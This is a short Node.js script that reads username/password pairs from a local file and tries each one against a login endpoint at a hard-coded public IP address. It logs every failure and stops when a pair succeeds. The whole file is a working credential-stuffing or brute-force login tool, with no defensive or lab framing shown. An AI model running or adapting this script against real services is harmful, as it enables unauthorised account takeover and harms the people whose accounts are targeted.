const axios = require('axios');
const fs = require('fs');

// Read users.json
const users = JSON.parse(fs.readFileSync('./user.json', 'utf8'));

const tryLogin = async () => {
  for (let user of users) {
    try {
      const response = await axios.post('http://13.250.213.36:3020/login', {
        username: user.username,
        password: user.password
      });

      // If login successful, log and stop
      if (response.data.success) {
        console.log("✅ Correct Credentials Found!");
        console.log(`Username: ${user.username}`);
        console.log(`Password: ${user.password}`);
        return;
      }
    } catch (error) {
      if (error.response && error.response.status === 401) {
        console.log(`❌ Failed: ${user.username} / ${user.password}`);
      } else {
        console.log(`⚠️ Error: ${error.message}`);
      }
    }
  }

  console.log("🔍 No valid credentials found.");
};

tryLogin();
